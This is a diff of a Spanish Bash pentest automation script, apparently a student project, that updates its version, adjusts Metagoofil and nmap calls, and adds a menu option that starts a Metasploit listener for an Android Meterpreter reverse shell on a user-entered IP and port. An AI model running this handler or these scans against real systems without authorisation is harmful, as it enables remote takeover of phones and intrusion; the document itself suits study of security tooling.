@@ -14,7 +14,7 @@ _banner()
   echo "         *    \/    \/\____|__| \___/ |__|  \___||_| |_||_|\___||___/___|   *"
   echo "         *                                                                  *"
   echo "         *                                                                  *"
-  echo "         *  AutoPenTest  Versión 0.0.3                                      *"
+  echo "         *  AutoPenTest  Versión 0.0.4                                      *"
   echo "         *  Codificado por D. Hervás Rodríguez                              *"
   echo "         *  dhervas18@alumnos.uned.es                                       *"
   echo "         *                                                                  *"
@@ -94,13 +94,23 @@ _mostrarResultado()
 
     if [ "$1" -eq "99" ]; then
       #sleep 3 & bash spinner.sh $!
-      service postgresql start || exit
+      #sudo service postgresql start || exit
 
-      msfconsole <<EOF
-      sleep 5
-      ?
-      quit
-EOF
+      #msfconsole <<EOF
+      #sleep 5
+      #?
+      #quit
+#EOF
+      echo "Enter ip: "
+      read ip
+
+      echo "Enter port: "
+      read port
+
+      msfconsole -q -x " use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set lhost $ip; set lport $port ; exploit;"
+      
+
+
 
     fi 
 
@@ -122,7 +132,7 @@ _metaGoofil(){
     rm /home/david/TFM/temp/metaGoofLog.txt
   fi
 
-  metagoofil -d $domain -t pdf -o /home/david/TFM/temp -f /home/david/TFM/temp/ficpdf.html > /home/david/TFM/temp/metaGoofLog.txt
+  metagoofil -d $domain -t pdf -o /home/david/TFM/temp -f /home/david/TFM/temp/metaGoof.html > /home/david/TFM/temp/metaGoofLog.txt
 
   if [ $? -ne 0 ]; then
     echo "Error en la ejecución de Metagoofil"
@@ -153,7 +163,7 @@ _nmap(){
   if [ -f /home/david/TFM/temp/nmap_output.txt ]; then
     rm /home/david/TFM/temp/nmap_output.txt
   fi
-  nmap -p- -oG /home/david/TFM/temp/nmap_output.txt $domain > /home/david/TFM/temp/nmapLog.txt
+  nmap -p- -O -oG /home/david/TFM/temp/nmap_output.txt $domain > /home/david/TFM/temp/nmapLog.txt
 
   if [ $? -ne 0 ]; then
     echo "Error en la ejecución de nmap"
